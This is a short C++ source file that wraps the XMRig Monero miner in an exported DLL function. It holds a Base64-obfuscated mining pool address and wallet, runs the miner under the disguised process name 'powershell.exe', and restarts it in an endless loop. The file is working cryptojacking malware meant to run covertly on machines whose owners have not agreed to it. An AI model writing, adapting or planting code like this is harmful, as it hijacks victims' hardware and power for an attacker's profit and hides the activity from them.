#include "Environment.h"
#include "Windows.h"
#include "base/kernel/Process.h"
#include "App.h"
#include <vector>
#include "base/tools/Base64.h"

extern "C" {
	__declspec(dllexport) void run();
}

using namespace xmrig;

void run() 
{
	static const char value1[] = "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjg=";
	static const char value2[] = "NDgzSGZUWk5qV1FkN1doRXRzMVdzZkF6b0FyMWVHYTVuZG1mamhYYjk5VktEbUpWRzNNUXczdUNSZ0U3YUtCUFFXREJFTlNOVlpkcThoQ2dOQnVRVWVKVkVZN2prZDE=";
	int buf1_len = move_0399_len(value1);
	int buf2_len = move_0399_len(value2);
	char* buf1 = new char[buf1_len];
	char* buf2 = new char[buf2_len];
	int buf1_act_size = move_0399(buf1, value1);
	int buf2_act_size = move_0399(buf2, value2);
	buf1[buf1_act_size] = '\0';
	buf2[buf2_act_size] = '\0';
	int args_count = 5;
	char* args[] = { "powershell.exe", "-o", buf1, "-u", buf2 };
	Process process(args_count, args);
	while (true)
	{
		App app(&process);
		app.exec();
	}
}
